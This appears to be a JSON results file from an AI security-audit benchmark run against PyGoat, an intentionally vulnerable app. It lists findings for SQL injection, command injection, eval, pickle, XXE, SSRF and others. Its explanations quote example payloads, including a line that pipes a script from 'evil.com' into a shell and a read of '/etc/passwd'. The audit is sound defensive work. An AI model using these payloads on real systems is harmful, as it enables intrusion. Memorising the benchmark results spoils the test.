@@ -1,0 +1,858 @@
+{
+  "arm": "P",
+  "label": "P-plain-sonnet5",
+  "eval_arm": "plain-sonnet5",
+  "benchmark": "pygoat",
+  "fixture_commit": "19d17cc8874861142b330636d068bbde54e86b85",
+  "model": "claude-sonnet-5",
+  "effort": "xhigh",
+  "status": "ok",
+  "usage": [
+    {
+      "uncached_in": 4448,
+      "cache_read": 2744824,
+      "cache_write": 112334,
+      "out": 44850,
+      "reasoning": null
+    }
+  ],
+  "wallclock_s": 482.1,
+  "findings": [
+    {
+      "file": "introduction/views.py",
+      "function": "sql_lab",
+      "line_start": 147,
+      "line_end": 189,
+      "cwe": "CWE-89",
+      "title": "SQL injection in login lab via raw query string concatenation",
+      "explanation": "The 'name' and 'pass' POST parameters are concatenated directly into a SQL string that is executed with login.objects.raw(), with no parameterization or escaping. An attacker can supply a value such as `' OR '1'='1' --` to bypass authentication or extract arbitrary data from the introduction_login table.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "sql_lab",
+          "line": 150,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "sql_lab",
+          "line": 158,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "sql_lab",
+          "line": 162,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "injection_sql_lab",
+      "line_start": 855,
+      "line_end": 904,
+      "cwe": "CWE-89",
+      "title": "SQL injection in A3 injection lab via raw query string concatenation",
+      "explanation": "The 'name' and 'pass' POST parameters are concatenated directly into a SQL string passed to sql_lab_table.objects.raw() without parameterization, allowing classic SQL injection to bypass authentication or read arbitrary rows.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "injection_sql_lab",
+          "line": 858,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "injection_sql_lab",
+          "line": 864,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "injection_sql_lab",
+          "line": 878,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "cmd_lab",
+      "line_start": 415,
+      "line_end": 450,
+      "cwe": "CWE-78",
+      "title": "OS command injection via 'domain' parameter passed to shell",
+      "explanation": "The 'domain' POST parameter only has a URL-scheme/www prefix stripped by a regex; it is then embedded in a shell command string run with subprocess.Popen(..., shell=True). Shell metacharacters (e.g. `; cat /etc/passwd`, `$(...)`, backticks) are not filtered, so an attacker can execute arbitrary OS commands.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab",
+          "line": 418,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab",
+          "line": 420,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab",
+          "line": 424,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab",
+          "line": 430,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "cmd_lab2",
+      "line_start": 453,
+      "line_end": 469,
+      "cwe": "CWE-94",
+      "title": "Code injection via eval() of raw POST input",
+      "explanation": "The 'val' POST parameter is passed directly into Python's eval() with no sanitization or sandboxing, allowing an attacker to execute arbitrary Python code on the server (e.g. `__import__('os').system('id')`).",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab2",
+          "line": 456,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "cmd_lab2",
+          "line": 460,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "insec_des_lab",
+      "line_start": 205,
+      "line_end": 221,
+      "cwe": "CWE-502",
+      "title": "Insecure deserialization of client-controlled pickle cookie",
+      "explanation": "The 'token' cookie is base64-decoded and passed to pickle.loads() without any integrity check or signature. Since pickle can execute arbitrary code during deserialization (via __reduce__), an attacker can craft a cookie value that achieves remote code execution, in addition to the demonstrated privilege escalation (setting admin=1).",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "insec_des_lab",
+          "line": 208,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "insec_des_lab",
+          "line": 213,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "insec_des_lab",
+          "line": 214,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "xxe_parse",
+      "line_start": 256,
+      "line_end": 270,
+      "cwe": "CWE-611",
+      "title": "XML External Entity (XXE) injection via unauthenticated endpoint",
+      "explanation": "The SAX parser explicitly enables feature_external_ges (external general entities) and parses the raw, attacker-supplied request body. This allows a crafted DOCTYPE/ENTITY declaration to read arbitrary local files or trigger SSRF/out-of-band requests. The view is also decorated @csrf_exempt with no authentication check, so it is reachable by anyone.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "xxe_parse",
+          "line": 260,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "xxe_parse",
+          "line": 259,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "xxe_parse",
+          "line": 268,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "a9_lab",
+      "line_start": 551,
+      "line_end": 569,
+      "cwe": "CWE-502",
+      "title": "Insecure deserialization via unsafe YAML loader on uploaded file",
+      "explanation": "The uploaded file is parsed with yaml.load(file, yaml.Loader) instead of yaml.safe_load / SafeLoader. The full Loader supports Python object construction tags (e.g. !!python/object/apply:os.system), enabling arbitrary code execution from an uploaded YAML document.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "a9_lab",
+          "line": 558,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "a9_lab",
+          "line": 560,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "xss_lab",
+      "line_start": 93,
+      "line_end": 104,
+      "cwe": "CWE-79",
+      "title": "Reflected XSS via 'q' search parameter rendered with |safe",
+      "explanation": "The GET 'q' parameter is passed unmodified into the template context as 'query' and rendered in xss_lab.html with the |safe filter, disabling Django's autoescaping. A payload like `<script>alert(1)</script>` executes in the victim's browser.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab",
+          "line": 95,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab",
+          "line": 101,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/templates/Lab/XSS/xss_lab.html",
+          "function": "template",
+          "line": 27,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "xss_lab2",
+      "line_start": 106,
+      "line_end": 120,
+      "cwe": "CWE-79",
+      "title": "Reflected XSS via bypassable blocklist and |safe rendering",
+      "explanation": "The 'username' POST parameter only has the literal substrings '<script>' and '</script>' stripped; any other tag/case variation (e.g. `<ScRiPt>`, `<img onerror=...>`) survives. The result is then rendered with the |safe filter in xss_lab_2.html, so the bypass payload executes in the browser.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab2",
+          "line": 109,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab2",
+          "line": 112,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/templates/Lab/XSS/xss_lab_2.html",
+          "function": "template",
+          "line": 20,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "xss_lab3",
+      "line_start": 122,
+      "line_end": 136,
+      "cwe": "CWE-79",
+      "title": "XSS via JSFuck-style payload injected into inline <script> block",
+      "explanation": "The 'username' POST parameter has only alphanumeric characters stripped (regex `[a-zA-Z0-9]`), leaving punctuation such as `[]()!+` untouched. The value is embedded directly inside an inline <script> tag in xss_lab_3.html. Django's default autoescaping only neutralizes `< > & ' \"`, none of which JSFuck-encoded JavaScript needs, so a fully alphanumeric-free JSFuck payload executes unmodified in the script context.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab3",
+          "line": 125,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "xss_lab3",
+          "line": 129,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/templates/Lab/XSS/xss_lab_3.html",
+          "function": "template",
+          "line": 22,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "software_and_data_integrity_failure_lab2",
+      "line_start": 1220,
+      "line_end": 1226,
+      "cwe": "CWE-79",
+      "title": "Reflected XSS via 'username' GET parameter rendered with |safe",
+      "explanation": "The GET 'username' parameter is placed into the template context unmodified and rendered in lab2.html with the |safe filter, allowing arbitrary HTML/JavaScript injection via a crafted URL.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "software_and_data_integrity_failure_lab2",
+          "line": 1223,
+          "role": "source"
+        },
+        {
+          "file": "introduction/templates/Lab_2021/A8_software_and_data_integrity_failure/lab2.html",
+          "function": "template",
+          "line": 11,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "ssrf_lab",
+      "line_start": 918,
+      "line_end": 933,
+      "cwe": "CWE-22",
+      "title": "Path traversal / arbitrary local file read via 'blog' parameter",
+      "explanation": "The 'blog' POST parameter is joined onto a fixed base directory with os.path.join and opened directly. os.path.join does not prevent traversal when the second argument contains '../' sequences or an absolute path, so a value like `../../../../etc/passwd` lets an attacker read arbitrary files readable by the application.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "ssrf_lab",
+          "line": 923,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ssrf_lab",
+          "line": 926,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ssrf_lab",
+          "line": 927,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "ssrf_lab2",
+      "line_start": 956,
+      "line_end": 966,
+      "cwe": "CWE-918",
+      "title": "Server-Side Request Forgery via unrestricted 'url' parameter",
+      "explanation": "The 'url' POST parameter is passed straight to requests.get() with no allowlist/denylist or validation of scheme or host. An authenticated attacker can make the server issue requests to internal-only services (as demonstrated by the paired ssrf_target view, which trusts requests originating from 127.0.0.1), cloud metadata endpoints, or other network-restricted resources, and read the response.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "ssrf_lab2",
+          "line": 961,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ssrf_lab2",
+          "line": 963,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "secret",
+      "line_start": 535,
+      "line_end": 540,
+      "cwe": "CWE-290",
+      "title": "Authentication bypass by trusting a client-supplied X-Host header",
+      "explanation": "Access to the secret value is granted solely based on the client-controlled 'X-Host' request header equalling 'admin.localhost:8000'. There is no server-side verification that the request actually originates from an admin host, and the endpoint requires no authentication at all, so any remote client can simply set this header to retrieve the secret.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "secret",
+          "line": 536,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "secret",
+          "line": 537,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "ssti_lab",
+      "line_start": 975,
+      "line_end": 1000,
+      "cwe": "CWE-1336",
+      "title": "Server-Side Template Injection via unfiltered blog content",
+      "explanation": "The 'blog' POST parameter is passed through filter_blog() (a no-op that returns the input unchanged), wrapped in Django template tags, and written out as a new .html template file under the app's template directory. ssti_view_blog then renders that file with Django's template engine, so any Django Template Language syntax submitted by the attacker (tags, filters, variable lookups into object internals) is executed server-side, enabling SSTI/code-execution-style attacks against the rendering context.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "ssti_lab",
+          "line": 981,
+          "role": "source"
+        },
+        {
+          "file": "introduction/utility.py",
+          "function": "filter_blog",
+          "line": 56,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ssti_lab",
+          "line": 996,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ssti_view_blog",
+          "line": 1006,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "sec_misconfig_lab3",
+      "line_start": 1090,
+      "line_end": 1110,
+      "cwe": "CWE-321",
+      "title": "JWT signed with hardcoded, guessable secret enables forged admin cookie",
+      "explanation": "The 'auth_cookie' JWT is signed and verified using SECRET_COOKIE_KEY, a short hardcoded string ('PYGOAT') committed in pygoat/settings.py. Anyone who obtains or guesses this value can mint their own JWT with payload {'user':'admin'} and HS256-sign it, producing a cookie that passes verification at line 1095 and grants admin access at line 1096.",
+      "path": [
+        {
+          "file": "pygoat/settings.py",
+          "function": "module-level",
+          "line": 171,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "sec_misconfig_lab3",
+          "line": 1095,
+          "role": "sink"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "sec_misconfig_lab3",
+          "line": 1096,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "pygoat/settings.py",
+      "function": "module-level",
+      "line_start": 25,
+      "line_end": 25,
+      "cwe": "CWE-321",
+      "title": "Django SECRET_KEY hardcoded and committed to source control",
+      "explanation": "Django's SECRET_KEY, which signs sessions, password-reset tokens, and other security-relevant data, is hardcoded in the committed settings file. Anyone with read access to the repository can forge valid session cookies or signed tokens, impersonating any user including staff/superusers.",
+      "path": []
+    },
+    {
+      "file": "introduction/mitre.py",
+      "function": "csrf_lab_login",
+      "line_start": 155,
+      "line_end": 174,
+      "cwe": "CWE-321",
+      "title": "JWT signed with hardcoded secret 'csrf_vulneribility'",
+      "explanation": "The auth_cookiee JWT used throughout the CSRF lab (login, dashboard, fund-transfer endpoints) is signed with a short hardcoded string literal. Anyone who reads the source (public on GitHub) can forge a valid session for any username without ever authenticating.",
+      "path": [
+        {
+          "file": "introduction/mitre.py",
+          "function": "csrf_lab_login",
+          "line": 169,
+          "role": "sink"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "csrf_transfer_monei",
+          "line": 182,
+          "role": "sink"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "csrf_transfer_monei_api",
+          "line": 194,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/mitre.py",
+      "function": "csrf_transfer_monei_api",
+      "line_start": 191,
+      "line_end": 210,
+      "cwe": "CWE-352",
+      "title": "Cross-Site Request Forgery in fund-transfer endpoint",
+      "explanation": "Funds are transferred based solely on a GET request and the forgeable auth_cookiee cookie, with no CSRF token check (the view also carries no CSRF protection at all for this state-changing action). An attacker can embed `<img src=\"/mitre/9/lab/api/attacker/1000\">` on any page; a logged-in victim's browser will automatically send the authentication cookie and execute the transfer without the victim's knowledge or consent.",
+      "path": [
+        {
+          "file": "introduction/mitre.py",
+          "function": "csrf_transfer_monei_api",
+          "line": 191,
+          "role": "source"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "csrf_transfer_monei_api",
+          "line": 204,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/mitre.py",
+      "function": "mitre_lab_25_api",
+      "line_start": 215,
+      "line_end": 221,
+      "cwe": "CWE-94",
+      "title": "Unauthenticated code injection via eval() of POST 'expression'",
+      "explanation": "The @authentication_decorator is commented out, so this endpoint is reachable without logging in. The 'expression' POST parameter is passed directly to Python's eval(), allowing any unauthenticated remote user to execute arbitrary Python code on the server.",
+      "path": [
+        {
+          "file": "introduction/mitre.py",
+          "function": "mitre_lab_25_api",
+          "line": 217,
+          "role": "source"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "mitre_lab_25_api",
+          "line": 218,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/mitre.py",
+      "function": "mitre_lab_17_api",
+      "line_start": 238,
+      "line_end": 247,
+      "cwe": "CWE-78",
+      "title": "Unauthenticated OS command injection via 'ip' parameter passed to nmap",
+      "explanation": "The 'ip' POST parameter is concatenated directly into a shell command executed via subprocess.Popen(..., shell=True) with zero sanitization. The view has no authentication check at all and is @csrf_exempt, so any remote, unauthenticated attacker can run arbitrary OS commands (e.g. `ip=1.1.1.1; curl evil.com|sh`).",
+      "path": [
+        {
+          "file": "introduction/mitre.py",
+          "function": "mitre_lab_17_api",
+          "line": 240,
+          "role": "source"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "mitre_lab_17_api",
+          "line": 241,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/mitre.py",
+          "function": "command_out",
+          "line": 233,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/apis.py",
+      "function": "log_function_checker",
+      "line_start": 61,
+      "line_end": 90,
+      "cwe": "CWE-94",
+      "title": "Unauthenticated arbitrary write to live application source files leads to RCE",
+      "explanation": "The '@authentication_decorator' guard is commented out, so any unauthenticated request can reach this endpoint. The 'log_code' and 'api_code' POST parameters are written verbatim, with no validation, to introduction/playground/A9/main.py and introduction/playground/A9/api.py -- real Python modules that are part of the running application and are imported/served by the URL at '2021/discussion/A9/target'. Under Django's autoreloading development server (DEBUG=True, manage.py runserver), modifying these .py files triggers a process reload that executes the attacker-supplied code, giving an unauthenticated attacker remote code execution.",
+      "path": [
+        {
+          "file": "introduction/apis.py",
+          "function": "log_function_checker",
+          "line": 64,
+          "role": "source"
+        },
+        {
+          "file": "introduction/apis.py",
+          "function": "log_function_checker",
+          "line": 65,
+          "role": "source"
+        },
+        {
+          "file": "introduction/apis.py",
+          "function": "log_function_checker",
+          "line": 69,
+          "role": "sink"
+        },
+        {
+          "file": "introduction/apis.py",
+          "function": "log_function_checker",
+          "line": 72,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/apis.py",
+      "function": "A6_disscussion_api_2",
+      "line_start": 126,
+      "line_end": 138,
+      "cwe": "CWE-94",
+      "title": "Unauthenticated arbitrary write to live application source file leads to RCE",
+      "explanation": "This endpoint has no authentication check and is @csrf_exempt. The 'code' POST parameter is written verbatim to introduction/playground/A6/utility.py, a module imported elsewhere in the application (introduction/apis.py imports check_vuln from it). Because the dev server autoreloads on source changes, an unauthenticated attacker's injected code is executed by the application process on the next reload.",
+      "path": [
+        {
+          "file": "introduction/apis.py",
+          "function": "A6_disscussion_api_2",
+          "line": 130,
+          "role": "source"
+        },
+        {
+          "file": "introduction/apis.py",
+          "function": "A6_disscussion_api_2",
+          "line": 134,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/apis.py",
+      "function": "ssrf_code_checker",
+      "line_start": 23,
+      "line_end": 54,
+      "cwe": "CWE-94",
+      "title": "Authenticated arbitrary code write/execution via SSRF playground",
+      "explanation": "The 'python_code' POST parameter is passed to ssrf_code_converter(), which writes it essentially unvalidated into introduction/playground/ssrf/main.py, a module imported and invoked (main.ssrf_lab(...)) by this same view. Because self-registration is open to anyone and the dev server autoreloads on source file changes, any registered user can get arbitrary Python code executed by the application process, far beyond the intended 'fix the vulnerable function' exercise.",
+      "path": [
+        {
+          "file": "introduction/apis.py",
+          "function": "ssrf_code_checker",
+          "line": 26,
+          "role": "source"
+        },
+        {
+          "file": "introduction/utility.py",
+          "function": "ssrf_code_converter",
+          "line": 35,
+          "role": "propagator"
+        },
+        {
+          "file": "introduction/apis.py",
+          "function": "ssrf_code_checker",
+          "line": 38,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "ba_lab",
+      "line_start": 342,
+      "line_end": 381,
+      "cwe": "CWE-290",
+      "title": "Authorization decision based on unsigned, client-controlled 'admin' cookie",
+      "explanation": "Admin access is granted if `request.COOKIES.get('admin') == \"1\"`. Since this cookie is never signed or validated server-side, any client can simply set `admin=1` in their browser (or via a crafted HTTP request) to obtain the admin-only secret without ever authenticating as admin.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "ba_lab",
+          "line": 347,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "ba_lab",
+          "line": 347,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "a1_broken_access_lab_1",
+      "line_start": 747,
+      "line_end": 780,
+      "cwe": "CWE-290",
+      "title": "Authorization decision based on unsigned, client-controlled 'admin' cookie",
+      "explanation": "Identical pattern to ba_lab: the view trusts a plain, unsigned 'admin' cookie value of \"1\" supplied by the client to grant admin-only content, allowing trivial privilege escalation by setting the cookie manually.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "a1_broken_access_lab_1",
+          "line": 758,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "a1_broken_access_lab_1",
+          "line": 758,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "a1_broken_access_lab_2",
+      "line_start": 783,
+      "line_end": 820,
+      "cwe": "CWE-290",
+      "title": "Authorization decision based on spoofable User-Agent header",
+      "explanation": "Admin-only content is returned if the client-supplied User-Agent header equals the literal string \"pygoat_admin\". HTTP headers are fully controlled by the client, so any attacker can set this header to bypass the intended access control entirely.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "a1_broken_access_lab_2",
+          "line": 791,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "a1_broken_access_lab_2",
+          "line": 797,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "a1_broken_access_lab3_secret",
+      "line_start": 837,
+      "line_end": 841,
+      "cwe": "CWE-862",
+      "title": "Missing authorization check allows any authenticated user to view the admin secret",
+      "explanation": "The view only checks request.user.is_authenticated and (per its own comment) performs no further authorization check, so any registered user can navigate directly to this URL and see the content that is supposed to require completing the admin login flow in a1_broken_access_lab_3.",
+      "path": []
+    },
+    {
+      "file": "introduction/views.py",
+      "function": "Otp",
+      "line_start": 493,
+      "line_end": 518,
+      "cwe": "CWE-307",
+      "title": "Brute-forceable OTP with no rate limiting or lockout",
+      "explanation": "OTP values are generated with randint(100,999) (only 900 possible values) and verified with a simple DB lookup that has no attempt counter, delay, or lockout. An attacker can script requests to the POST branch trying all 900 values (including against the admin OTP record, id=2) and will reliably succeed within a small number of attempts.",
+      "path": [
+        {
+          "file": "introduction/views.py",
+          "function": "Otp",
+          "line": 496,
+          "role": "source"
+        },
+        {
+          "file": "introduction/views.py",
+          "function": "Otp",
+          "line": 514,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "dockerized_labs/broken_auth_lab/app.py",
+      "function": "dashboard",
+      "line_start": 104,
+      "line_end": 120,
+      "cwe": "CWE-290",
+      "title": "Authentication bypass via forgeable, unsigned session cookie",
+      "explanation": "The 'session' cookie is just base64(\"username:timestamp\") with no HMAC/signature or server-side session store. dashboard() trusts the decoded username directly to decide which account's role/email to render. Any client can forge a cookie for an arbitrary existing username (e.g. `base64(\"admin:x\")`) and the application will treat them as that user, fully bypassing the password check in login().",
+      "path": [
+        {
+          "file": "dockerized_labs/broken_auth_lab/app.py",
+          "function": "login",
+          "line": 45,
+          "role": "source"
+        },
+        {
+          "file": "dockerized_labs/broken_auth_lab/app.py",
+          "function": "dashboard",
+          "line": 105,
+          "role": "propagator"
+        },
+        {
+          "file": "dockerized_labs/broken_auth_lab/app.py",
+          "function": "dashboard",
+          "line": 111,
+          "role": "sink"
+        },
+        {
+          "file": "dockerized_labs/broken_auth_lab/app.py",
+          "function": "dashboard",
+          "line": 112,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "dockerized_labs/insec_des_lab/main.py",
+      "function": "deserialize_data",
+      "line_start": 31,
+      "line_end": 48,
+      "cwe": "CWE-502",
+      "title": "Insecure deserialization of client-supplied pickle data",
+      "explanation": "The 'serialized_data' form field is base64-decoded and passed directly to pickle.loads() with no integrity check. Besides the demonstrated privilege escalation (crafting is_admin=True), pickle deserialization of untrusted data can execute arbitrary code via a crafted object's __reduce__ method, giving full remote code execution.",
+      "path": [
+        {
+          "file": "dockerized_labs/insec_des_lab/main.py",
+          "function": "deserialize_data",
+          "line": 33,
+          "role": "source"
+        },
+        {
+          "file": "dockerized_labs/insec_des_lab/main.py",
+          "function": "deserialize_data",
+          "line": 34,
+          "role": "propagator"
+        },
+        {
+          "file": "dockerized_labs/insec_des_lab/main.py",
+          "function": "deserialize_data",
+          "line": 36,
+          "role": "sink"
+        }
+      ]
+    },
+    {
+      "file": "dockerized_labs/sensitive_data_exposure/dataexposure/views.py",
+      "function": "all_users_data_view",
+      "line_start": 112,
+      "line_end": 132,
+      "cwe": "CWE-862",
+      "title": "Unauthenticated endpoint exposes every user's credit card, SSN, and API key",
+      "explanation": "This view performs no authentication or authorization check whatsoever before returning every row of UserData (credit card number, SSN, API key) as JSON. Any unauthenticated remote client can call GET /api/all-users/ and harvest the full PII/credential set for all registered users.",
+      "path": [
+        {
+          "file": "dockerized_labs/sensitive_data_exposure/dataexposure/views.py",
+          "function": "all_users_data_view",
+          "line": 120,
+          "role": "source"
+        },
+        {
+          "file": "dockerized_labs/sensitive_data_exposure/dataexposure/views.py",
+          "function": "all_users_data_view",
+          "line": 132,
+          "role": "sink"
+        }
+      ]
+    }
+  ]
+}
